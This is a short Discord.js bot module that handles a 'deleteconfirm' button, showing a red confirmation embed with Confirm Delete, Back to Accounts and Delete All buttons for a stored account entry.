const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const { queryParams } = require("../../../db/database");
const accountsmsg = require("../../../autosecure/utils/accounts/accountsmsg");

module.exports = {
    name: "deleteconfirm",
    callback: async (client, interaction) => {
        let [t, id, current, uid] = interaction.customId.split("|"); // Extract UID from customId
        current = parseInt(current);

        // Create confirmation embed
        let embed = new EmbedBuilder()
            .setColor(0xff0000) // Red color for warning
            .setTitle("Confirm Deletion")
            .setDescription(`Are you sure you want to delete this account? **This action cannot be undone.**`);

        // Buttons placed next to each other in the same row
        let buttonsRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`deletefinal|${id}|${current}|${uid}`) // Pass UID to deletefinal
                .setLabel("Confirm Delete")
                .setStyle(ButtonStyle.Danger),
            new ButtonBuilder()
                .setCustomId(`backtoaccounts|${id}|${current}`)
                .setLabel("Back to Accounts")
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`deleteaccounts|${id}|${current}`) // Pass current to deleteall
                .setLabel("Delete All")
                .setStyle(ButtonStyle.Danger)
        );

        // Update interaction with confirmation embed
        await interaction.update({ 
            embeds: [embed], 
            components: [buttonsRow], 
            ephemeral: true 
        });
    }
};